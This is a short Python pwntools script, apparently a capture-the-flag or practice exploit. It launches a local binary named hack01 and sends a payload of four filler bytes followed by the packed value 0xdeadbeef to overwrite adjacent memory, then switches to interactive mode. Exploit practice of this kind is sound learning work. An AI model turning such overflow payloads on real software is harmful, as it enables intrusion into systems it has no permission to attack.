from pwn import *

context.arch="amd64"
context.log_level='debug'
p=process("./hack01")
payload=b"A"*0x4+p64(0xdeadbeef)
p.recvuntil(b':')
p.send(payload)
p.interactive()